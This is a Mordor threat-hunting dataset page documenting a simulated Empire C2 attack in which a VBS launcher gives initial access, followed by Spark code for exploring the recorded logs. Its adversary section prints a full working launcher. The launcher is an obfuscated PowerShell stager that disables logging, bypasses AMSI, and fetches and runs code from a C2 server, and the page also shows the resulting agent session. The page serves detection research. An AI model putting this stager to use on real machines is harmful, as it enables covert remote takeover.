# Empire Launcher VBS

## Metadata


|                   |    |
|:------------------|:---|
| id                | SD-190518182022 |
| author            | Roberto Rodriguez @Cyb3rWard0g |
| creation date     | 19/05/18 |
| platform          | Windows |
| Mordor Environment| shire |
| Simulation Type   | C2 |
| Simulation Tool   | Empire |
| Simulation Script |  |
| Mordor Dataset    | https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/execution/empire_launcher_vbs.tar.gz |

## Dataset Description
This dataset represents adversaries executing a VBS script as a launcher for initial access

## Adversary View
```
(Empire: listeners) > usestager windows/launcher_vbs
(Empire: stager/windows/launcher_vbs) > info

Name: VBS Launcher

Description:
  Generates a .vbs launcher for Empire.

Options:

  Name             Required    Value             Description
  ----             --------    -------           -----------
  Listener         True                          Listener to generate stager for.
  OutFile          False       /tmp/autoupdate.vbs File to output .vbs launcher to,
                                                otherwise displayed on the screen.
  Obfuscate        False       False             Switch. Obfuscate the launcher
                                                powershell code, uses the
                                                ObfuscateCommand for obfuscation types.
                                                For powershell only.
  ObfuscateCommand False       Token\All\1,Launcher\PS\12467The Invoke-Obfuscation command to use.
                                                Only used if Obfuscate switch is True.
                                                For powershell only.
  Language         True        powershell        Language of the stager to generate.
  ProxyCreds       False       default           Proxy credentials
                                                ([domain\]username:password) to use for
                                                request (default, none, or other).
  UserAgent        False       default           User-agent string to use for the staging
                                                request (default, none, or other).
  Proxy            False       default           Proxy to use for request (default, none,
                                                or other).
  StagerRetries    False       0                 Times for the stager to retry
                                                connecting.


(Empire: stager/windows/launcher_vbs) > set Listener https
(Empire: stager/windows/launcher_vbs) > execute

[*] Stager output written out to: /tmp/autoupdate.vbs

(Empire: stager/windows/launcher_vbs) > 

File is created and contains:

Dim objShell
Set objShell = WScript.CreateObject("WScript.Shell")
command = "powershell -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAHIAcwBJAE8AbgBUAEEAYgBMAGUALgBQAFMAVgBlAHIAcwBJAG8AbgAuAE0AYQBKAE8AcgAgAC0ARwBlACAAMwApAHsAJAA4AEQAQQBjADEAPQBbAFIARQBmAF0ALgBBAFMAcwBFAE0AQgBMAHkALgBHAGUAVABUAFkAUABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAEUAYABsAEQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQAOABEAEEAQwAxACkAewAkADMAMgBlADQARgA9ACQAOABkAEEAQwAxAC4ARwBlAHQAVgBBAGwAdQBlACgAJABuAHUATABMACkAOwBJAEYAKAAkADMAMgBFADQARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADMAMgBlADQARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAzADIARQA0AGYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEAbAA9AFsAQwBvAGwATABlAGMAVABJAG8AbgBTAC4ARwBFAG4ARQBSAGkAQwAuAEQASQBjAFQAaQBPAG4AQQByAHkAWwBTAHQAcgBpAG4ARwAsAFMAeQBTAHQAZQBNAC4ATwBiAEoAZQBjAFQAXQBdADoAOgBuAGUAVwAoACkAOwAkAHYAYQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAFYAQQBMAC4AQQBEAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAMwAyAEUANABmAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBsAH0ARQBMAFMARQB7AFsAUwBDAHIAaQBwAFQAQgBMAE8AYwBrAF0ALgAiAEcAZQBUAEYAaQBFAGAAbABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEATABVAGUAKAAkAG4AVQBMAEwALAAoAE4AZQB3AC0ATwBiAGoARQBDAFQAIABDAE8AbABMAEUAQwBUAEkAbwBOAHMALgBHAEUAbgBlAFIASQBDAC4ASABBAFMASABTAGUAdABbAHMAdAByAEkAbgBnAF0AKQApAH0AJABSAEUARgA9AFsAUgBlAGYAXQAuAEEAcwBTAGUATQBCAEwAeQAuAEcAZQBUAFQAWQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBGAC4ARwBlAHQARgBpAEUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEAbABVAEUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AEUAKQA7AH0AOwBbAFMAeQBTAFQARQBNAC4ATgBlAHQALgBTAEUAcgBWAGkAQwBFAFAATwBJAG4AdABNAGEATgBBAEcARQBSAF0AOgA6AEUAeABQAEUAQwBUADEAMAAwAEMATwBuAFQAaQBuAFUARQA9ADAAOwAkADQAMwBFAGYAMwA9AE4ARQB3AC0ATwBiAEoARQBjAFQAIABTAHkAcwB0AEUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAEkAZQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQANAAzAGUAZgAzAC4ASABFAGEAZABlAFIAcwAuAEEAZABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANAAzAGUARgAzAC4ASABlAGEAZABlAHIAcwAuAEEARABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANAAzAGUAZgAzAC4AUAByAG8AeAB5AD0AWwBTAFkAUwB0AGUATQAuAE4AZQB0AC4AVwBFAEIAUgBlAHEAdQBlAHMAVABdADoAOgBEAEUARgBhAFUAbAB0AFcAZQBCAFAAUgBPAFgAeQA7ACQANAAzAGUAZgAzAC4AUABSAG8AeAB5AC4AQwBSAGUAZABFAG4AVABpAGEAbABTACAAPQAgAFsAUwBZAHMAVABlAG0ALgBOAGUAdAAuAEMAcgBlAGQARQBuAHQASQBBAEwAQwBhAGMAaABlAF0AOgA6AEQARQBGAEEAdQBMAHQATgBlAFQAdwBPAFIASwBDAHIARQBEAGUAbgB0AGkAYQBMAHMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8AeAB5ACAAPQAgACQANAAzAGUAZgAzAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwBUAGUAbQAuAFQAZQB4AFQALgBFAG4AYwBvAGQAaQBOAEcAXQA6ADoAQQBTAEMASQBJAC4ARwBFAFQAQgBZAHQARQBTACgAJwB+AGsAKgBfAEYAUwBqAHIAOAAlAHgAdwBlAEoANgBoAHwAUABLAC4AZgB7AFUATgBNAEgAdQBkAHAANQB5AG0AJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBHAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAE8AdQBuAFQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgB4AE8AcgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJABzAGUAcgA9ACQAKABbAFQAZQBYAHQALgBFAE4AQwBvAEQASQBOAEcAXQA6ADoAVQBOAGkAYwBPAEQAZQAuAEcARQB0AFMAdAByAGkATgBHACgAWwBDAE8ATgB2AGUAcgBUAF0AOgA6AEYAUgBvAG0AQgBBAHMARQA2ADQAUwB0AFIAaQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQgB6AEEARABvAEEATAB3AEEAdgBBAEQARQBBAE0AQQBBAHUAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAeABBAEQAQQBBAE4AZwBBAD0AJwApACkAKQA7ACQAdAA9ACcALwBuAGUAdwBzAC4AcABoAHAAJwA7ACQANAAzAEUAZgAzAC4ASABlAEEAZABFAHIAUwAuAEEAZABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBIAFkAdgBsAFAASgBNAG0AcwBrAHkATgBGAFQAawA9AHoAbwBqADAAdgBDAE0ATwBsAFYAZQByADIARgBJAFMAZgBpAEYAawBSAEMAagBsAHIAOABjAD0AIgApADsAJABEAGEAVABhAD0AJAA0ADMARQBmADMALgBEAE8AdwBuAGwAbwBBAEQARABBAFQAYQAoACQAUwBlAHIAKwAkAFQAKQA7ACQAaQB2AD0AJABEAGEAVABBAFsAMAAuAC4AMwBdADsAJABEAEEAdABBAD0AJABkAEEAVABBAFsANAAuAC4AJABkAEEAdABBAC4AbABlAE4ARwB0AEgAXQA7AC0AagBvAGkAbgBbAEMASABhAHIAWwBdAF0AKAAmACAAJABSACAAJABEAEEAdABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA="
objShell.Run command,0
Set objShell = Nothing

User downloads and clicks on vbs file:

(Empire) > 
(Empire) > [*] Sending POWERSHELL stager (stage 1) to 10.0.10.103
[*] New agent H3DKB8SA checked in
[+] Initial agent H3DKB8SA from 10.0.10.103 now active (Slack)
[*] Sending agent (stage 2) to H3DKB8SA at 10.0.10.103

(Empire) > 
(Empire) > agents

[*] Active agents:

Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
H3DKB8SA ps 172.18.39.106   HR001             SHIRE\nmartha           powershell         5172   5/0.0    2019-05-18 18:21:29  https           

(Empire: agents) > 
```

## Explore Mordor Dataset

### Initialize Analytics Engine

from openhunt.mordorutils import *
spark = get_spark()

### Download & Process Mordor File

mordor_file = "https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/execution/empire_launcher_vbs.tar.gz"
registerMordorSQLTable(spark, mordor_file, "mordorTable")

### Get to know your data

df = spark.sql(
    '''
SELECT channel, COUNT(1)
FROM mordorTable
GROUP BY channel
    '''
)
df.show(10,False)
        